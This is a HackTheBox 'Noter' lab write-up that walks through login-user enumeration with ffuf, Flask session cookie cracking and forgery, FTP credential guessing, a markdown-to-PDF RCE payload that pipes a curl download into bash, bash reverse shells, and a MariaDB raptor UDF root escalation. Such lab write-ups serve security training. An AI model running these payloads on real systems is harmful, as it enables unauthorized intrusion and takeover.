---
title: "HTB - Noter"
classes: wide
header:
  teaser: /assets/images/htb/htb.png
ribbon: blue
description: "Writeup for HTB - Noter"
categories:
  - HTB
---

The given box ```Noter``` is a Linux machine 

- [HackTheBox- Noter](#hackthebox---Noter)
- [Recon](#recon)
	- [Nmap Scan](#nmap-scan)
- [Enumeration](#enumeration)
- [Exploiting the vulnerability](#Exploiting-the-vulnerability)
- [Privilege Escalation](#Privilege-Escalation)

## Recon

### Nmap Scan

`nmap` found 3 open ports on TCP scan.

```shell
┌─[htb-enum0re☺pwnbox-base]─[~/htb/boxes/noter]
└──╼ $cat nmap/initial_scan.nmap
# Nmap 7.92 scan initiated Tue Sep  6 14:49:19 2022 as: nmap -sC -sV -oN nmap/initial_scan.nmap -v 10.10.11.160
Nmap scan report for 10.10.11.160
Host is up (0.064s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 c6:53:c6:2a:e9:28:90:50:4d:0c:8d:64:88:e0:08:4d (RSA)
|   256 5f:12:58:5f:49:7d:f3:6c:bd:9b:25:49:ba:09:cc:43 (ECDSA)
|_  256 f1:6b:00:16:f7:88:ab:00:ce:96:af:a6:7e:b5:a8:39 (ED25519)
5000/tcp open  http    Werkzeug httpd 2.0.2 (Python 3.8.10)
| http-methods:
|_  Supported Methods: GET HEAD OPTIONS
|_http-title: Noter
|_http-server-header: Werkzeug/2.0.2 Python/3.8.10
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Sep  6 14:49:33 2022 -- 1 IP address (1 host up) scanned in 14.32 seconds
```


## Enumeration

### Finding any possible vuln on  ftp

Through searchsploit got only `Denial of Service` vulnerability on vsftpd 3.0.3

### Site

<center>
<img src="https://raw.githubusercontent.com/0xM3M0RY/htb_ctf/main/LINUX/noter/assets/images/1.png" >
</center>

### Exploring the features

	Noter -> doesn't have any linked page
	Register -> new registration
	Login -> sign-in page
	Notes -> redirects to login page as of now

### Registration

<center>
<img src="https://raw.githubusercontent.com/0xM3M0RY/htb_ctf/main/LINUX/noter/assets/images/2.png" >
</center>

Once registration done, we can login through our credentials.

<center>
<img src="https://raw.githubusercontent.com/0xM3M0RY/htb_ctf/main/LINUX/noter/assets/images/3.png" >
</center>

After logging in, from the dashboard we can see add a note and upgrade to vip,

### Exploring the features after login

	Add note -> this feature allow us to add some data
	VIP -> We are currently not able to provide new premium memberships due to some problems in our end. We will let you know once we are back on. Thank you! 
	Notes -> added notes can be seen in that page

But there is a session with cookie running in the background after login,

<center>
<img src="https://raw.githubusercontent.com/0xM3M0RY/htb_ctf/main/LINUX/noter/assets/images/4.png" >
</center>

So, the cookie we found is `flask-session cookie` and decoding it we got 

```json
{
    "logged_in": true,
    "username": "0xm3mory"
}
```

### Bruteforcing the login part

<center>
<img src="https://raw.githubusercontent.com/0xM3M0RY/htb_ctf/main/LINUX/noter/assets/images/5.png" >
</center>

	username -> valid
	password -> invalid
	output -> Invalid login

<center>
<img src="https://raw.githubusercontent.com/0xM3M0RY/htb_ctf/main/LINUX/noter/assets/images/6.png" >
</center>

	username -> invalid
	password -> invalid
	output -> Invalid credentials

```shell
┌─[htb-enum0re☺pwnbox-base]─[~]
└──╼ $ffuf -u http://10.10.11.160:5000/login -d 'username=FUZZ&password=2343442' -H 'Content-Type:application/x-www-form-urlencoded' -w names.txt -mr 'Invalid login'

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v1.3.1 Kali Exclusive <3
________________________________________________

 :: Method           : POST
 :: URL              : http://10.10.11.160:5000/login
 :: Wordlist         : FUZZ: names.txt
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Data             : username=FUZZ&password=2343442
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Regexp: Invalid login
________________________________________________

blue                    [Status: 200, Size: 2029, Words: 432, Lines: 69]
[WARN] Caught keyboard interrupt (Ctrl-C)
```

`blue` is another user.

### Crack Flask-session cookie

`flask-unsign` tool helps to crack the cookie,

```shell
┌─[htb-enum0re☺pwnbox-base]─[~/htb/boxes/noter]
└──╼ $ flask-unsign -u -nE -w ~/htb/boxes/noter/www/rockyou.txt -c eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiMHhtM21vcnkifQ.YxdlwQ.Ncoz_DXhXW3k_rGVrV8yjuWXxMg
[*] Session decodes to: {'logged_in': True, 'username': '0xm3mory'}
[*] Starting brute-forcer with 8 threads..
[+] Found secret key after 17152 attempts
b'secret123'
```

	secret -> secret123

Now we are going to manipulate the username to `blue` for to get the `JWT` token

```shell
┌─[htb-enum0re☺pwnbox-base]─[~/htb/boxes/noter]
└──╼ $ flask-unsign -s  --secret 'secret123' -c '{"logged_in": True, "username": "blue"}'
eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiYmx1ZSJ9.YxdnBQ.bg7BmShdAUJQCO_OVc3f1zbBefg
```

### Blue user

<center>
<img src="https://raw.githubusercontent.com/0xM3M0RY/htb_ctf/main/LINUX/noter/assets/images/7.png" >
</center>

<center>
<img src="https://raw.githubusercontent.com/0xM3M0RY/htb_ctf/main/LINUX/noter/assets/images/8.png" >
</center>

### Enumerating on ftp service

	name: blue
	password: blue@Noter!

```shell
┌─[htb-enum0re☺pwnbox-base]─[~]
└──╼ $ftp 10.10.11.160
Connected to 10.10.11.160.
220 (vsFTPd 3.0.3)
Name (10.10.11.160:root): blue
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 1002     1002         4096 May 02 23:05 files
-rw-r--r--    1 1002     1002        12569 Dec 24  2021 policy.pdf
```

<center>
<img src="https://raw.githubusercontent.com/0xM3M0RY/htb_ctf/main/LINUX/noter/assets/images/9.png" >
</center>

Based on the password creation policy and `ftp_admin` account we can login as ftp_admin in ftp service.

	name: ftp_admin
	password: ftp_admin@Noter!

```shell
┌─[htb-enum0re☺pwnbox-base]─[~]
└──╼ $ftp 10.10.11.160
Connected to 10.10.11.160.
220 (vsFTPd 3.0.3)
Name (10.10.11.160:root): ftp_admin
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 1003     1003        25559 Nov 01  2021 app_backup_1635803546.zip
-rw-r--r--    1 1003     1003        26298 Dec 01  2021 app_backup_1638395546.zip
226 Directory send OK.
```

### Differentiating app.py files

<center>
<img src="https://raw.githubusercontent.com/0xM3M0RY/htb_ctf/main/LINUX/noter/assets/images/10.png" >
</center>

<center>
<img src="https://raw.githubusercontent.com/0xM3M0RY/htb_ctf/main/LINUX/noter/assets/images/11.png" >
</center>

<center>
<img src="https://raw.githubusercontent.com/0xM3M0RY/htb_ctf/main/LINUX/noter/assets/images/12.png" >
</center>

## Exploiting the vulnerability

```shell
┌─[htb-enum0re☺pwnbox-base]─[~]
└──╼ $cat shell.md
---js\n((require("child_process")).execSync("curl 10.10.14.9:8000/RCE | bash"))\n---RCE
┌─[htb-enum0re☺pwnbox-base]─[~]
└──╼ $cat RCE
bash -i >& /dev/tcp/10.10.14.9/443 0>&1
```

<center>
<img src="https://raw.githubusercontent.com/0xM3M0RY/htb_ctf/main/LINUX/noter/assets/images/13.png" >
</center>

```shell
svc@noter:/tmp$ ls
1                                    systemd-private-536b93aa4bc545639637298d832813c1-systemd-logind.service-ZAApgg     tmux-1001
linpeas.sh                           systemd-private-536b93aa4bc545639637298d832813c1-systemd-resolved.service-fP2AGh   vmware-root_741-4248811580
puppeteer_dev_chrome_profile-ZDfdLZ  systemd-private-536b93aa4bc545639637298d832813c1-systemd-timesyncd.service-3Aq7cf
puppeteer_dev_chrome_profile-ckz4Aq  systemd-private-536b93aa4bc545639637298d832813c1-upower.service-UYz2hj
svc@noter:/tmp$ ls -al 1
-rw-r--r-- 1 root root 2 Sep  6 16:33 1
```


## Privilege Escalation

From the source code, we got the db credentials as `DB_user & root` using root user checked the udf part that was working fine. So used the `raptor script` to escalate the privilege.

```sql
MariaDB [mysql]> use mysql;
Database changed
MariaDB [mysql]> create table foo(line blob);
Query OK, 0 rows affected (0.006 sec)

MariaDB [mysql]> insert into foo values(load_file('/tmp/raptor_udf2.so'));
Query OK, 1 row affected (0.003 sec)

MariaDB [mysql]> show variables like '%plugin%';
+-----------------+---------------------------------------------+
| Variable_name   | Value                                       |
+-----------------+---------------------------------------------+
| plugin_dir      | /usr/lib/x86_64-linux-gnu/mariadb19/plugin/ |
| plugin_maturity | gamma                                       |
+-----------------+---------------------------------------------+
2 rows in set (0.002 sec)

MariaDB [mysql]> select * from foo into dumpfile '/usr/lib/x86_64-linux-gnu/mariadb19/plugin/raptor_udf2.so';
Query OK, 1 row affected (0.001 sec)

MariaDB [mysql]> create function do_system returns integer soname 'raptor_udf2.so';
Query OK, 0 rows affected (0.001 sec)

MariaDB [mysql]> select * from mysql.func;
+-----------+-----+----------------+----------+
| name      | ret | dl             | type     |
+-----------+-----+----------------+----------+
| do_system |   2 | raptor_udf2.so | function |
+-----------+-----+----------------+----------+
1 row in set (0.000 sec)

MariaDB [mysql]> select do_system("bash -c 'bash -i >& /dev/tcp/10.10.14.9/9001 0>&1'");
```

**Note:**  The path were we are going to dump the file is not correct as mentioned in the exploit so I modified the path and to modify the path use this to fetch the data `show variables like '%plugin%';`

```shell
┌─[htb-enum0re☺pwnbox-base]─[~/htb/boxes/noter/www]
└──╼ $sudo nc -lvnp 9001
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::9001
Ncat: Listening on 0.0.0.0:9001
Ncat: Connection from 10.10.11.160.
Ncat: Connection from 10.10.11.160:43120.
bash: cannot set terminal process group (952): Inappropriate ioctl for device
bash: no job control in this shell
root@noter:/var/lib/mysql# ls
```